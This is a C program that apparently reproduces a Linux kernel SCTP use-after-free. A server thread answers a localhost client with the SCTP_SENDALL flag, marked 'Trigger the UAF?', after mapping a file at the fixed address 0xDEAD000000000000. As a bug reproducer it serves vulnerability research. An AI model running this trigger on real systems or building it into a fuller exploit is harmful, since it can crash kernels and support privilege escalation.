
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <stdarg.h>
#include <string.h>

#include <sys/socket.h>
#include <sys/types.h>

// Test file mapping
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

#include <netinet/in.h>
#include <netinet/sctp.h>
#include <arpa/inet.h>

#include <sys/mman.h>

#include <pthread.h>




#define t_printf(...) { \
  printf("[%s] ", __func__); \
  printf(__VA_ARGS__); \
}
#define t_perror(s) { \
  fprintf(stderr, "[%s] ", __func__); \
  perror(s); \
}


#if 0
enum sctp_sinfo_flags {
SCTP_UNORDERED    = (1 << 0), /* Send/receive message unordered. */
SCTP_ADDR_OVER    = (1 << 1), /* Override the primary destination. */
SCTP_ABORT    = (1 << 2), /* Send an ABORT message to the peer. */
SCTP_SACK_IMMEDIATELY  = (1 << 3), /* SACK should be sent without delay. */
SCTP_SENDALL    = (1 << 6)
};
#endif

#define SCTP_SENDALL (1 << 6)

int server_thread_ready = 0;

void* t_server(void* server_port) {
  int tmp;
  t_printf("Hello, I'm Server!\n");
  t_printf("Creating socket\n");
  int fd = socket(AF_INET, SOCK_SEQPACKET, IPPROTO_SCTP);
  if (fd == -1) {
    t_perror(__func__);
    exit(1);
  }
  t_printf("Socket created\n");

  struct sockaddr_in my_addr, peer_addr;
  socklen_t peer_addr_size;
  memset(&my_addr, 0, sizeof(struct sockaddr_in));

  my_addr.sin_family = AF_INET;
  //my_addr.sin_addr.s_addr = htons((short)(uint64_t)server_port);
  my_addr.sin_port = htons((short)(uint64_t)server_port);
  inet_pton(AF_INET, "127.0.0.1", &(my_addr.sin_addr));

  
  if (bind(fd, (struct sockaddr*)&my_addr, sizeof(my_addr)) != 0) {
    t_perror(__func__);
    exit(1);
  }
  t_printf("Bound to localhost: %d\n", (short)(uint64_t)server_port);

  if (listen(fd, 8) != 0) {
    t_perror(__func__);
    exit(1);
  }

  t_printf("Listening on localhost, backlog 8\n");
  
  struct sctp_sndrcvinfo sinfo;
  int msg_flags;
  char buf[256];


  *buf = 0;
  while (1) {
    server_thread_ready = 1;
    tmp = sctp_recvmsg(fd, buf, 16, (struct sockaddr*)&peer_addr, &peer_addr_size, &sinfo, &msg_flags);
    if (tmp < 0) {
      perror("server recvmsg failed");
      return 0;
    }



    t_printf("Message received\n");
    buf[16]=0;
    t_printf("RECV(\"%s\")\n", buf);

    // Trigger the UAF?
    sinfo.sinfo_flags = SCTP_SENDALL;// | SCTP_ABORT;
    t_printf("SENDALL | ABORT\n");
    tmp = sctp_sendmsg(fd, buf, 16, (struct sockaddr*)&peer_addr, peer_addr_size, 
            sinfo.sinfo_ppid, sinfo.sinfo_flags, sinfo.sinfo_stream, 0, 0);
    if (tmp < 0) {
      perror("SCTP_SENDALL");
    }
    goto clean_exit;
  }
  t_printf("Server thread received exit; spinning...");
  while(1);

clean_exit:
  return 0;
} 

void* t_client(void* server_port) {
  int tmp;
  t_printf("Hello, I'm Client!\n");
  int fd = socket(AF_INET, SOCK_SEQPACKET, IPPROTO_SCTP);
  if (fd == -1) {
    t_perror(__func__);
    exit(1);
  }

  struct sockaddr_in srv_addr;
  memset(&srv_addr, 0, sizeof(srv_addr));
  srv_addr.sin_family = AF_INET;

  srv_addr.sin_addr.s_addr = htonl(INADDR_ANY);
  srv_addr.sin_port = htons((short)(uint64_t)server_port);
  inet_aton("127.0.0.1", &(srv_addr.sin_addr));

  // sinfo for storage
  struct sctp_sndrcvinfo sinfo;
  sinfo.sinfo_ppid = 0;
  sinfo.sinfo_flags = 0;
  sinfo.sinfo_stream = 0;

  
  

  char buf[] = "client";

  //scanf("%s", buf);

  t_printf("sending msg: %s\n", buf);

  tmp = sctp_sendmsg(fd, buf, sizeof(buf), 
                   (struct sockaddr*)&srv_addr, sizeof(srv_addr), 
                   sinfo.sinfo_ppid, sinfo.sinfo_flags,
                   sinfo.sinfo_stream, 0, 0); 

  if (tmp < 0) {
    t_perror("sendmsg failed");
  } else {
    t_printf("sendmsg: %d bytes sent\n", tmp);
  }


  t_printf("Client exit\n");
  return 0;
}


int main(int argc, char** argv) {
  if (argc < 2) {
    fprintf(stderr, "Usage: %s <PORT>\n", argv[0]);
    return -1;
  }
  // Test allocations
  //

  int testfile_fd = -1;
  testfile_fd = open("testfile", O_RDWR);
  if (testfile_fd == -1) {
    t_perror("opening testfile failed");
    return 0;
  }

  void *deadptr = 0;
  deadptr = mmap( (void*)0xDEAD000000000000, 4096, 
    PROT_WRITE | PROT_READ, MAP_SHARED, 
    testfile_fd, 0);
  if (deadptr == 0) {
    t_perror("Memory mapping failed");
    return 0;
  }

  t_printf("File mapped at %p\n", deadptr);

  int server_port;
  server_port = atoi(argv[1]);
  pthread_t server_thread, client_thread;

  for (uint64_t i = server_port; i < server_port + 1; i++) {
    server_thread_ready = 0;
    if (pthread_create(&server_thread, NULL, &t_server, (void*)i)) {
      fprintf(stderr, "Could not create server thread\n");
      exit(0);
    }
  
    while (!server_thread_ready); // Wait until server is ready to recv mesg
    if (pthread_create(&client_thread, NULL, &t_client, (void*)i)) {
      fprintf(stderr, "Could not create client thread\n");
      exit(0);
    }

    pthread_join(server_thread, NULL);
    pthread_join(client_thread, NULL);
  }
  munmap(deadptr, 4096);
  close(testfile_fd);
  
  return 0;
}
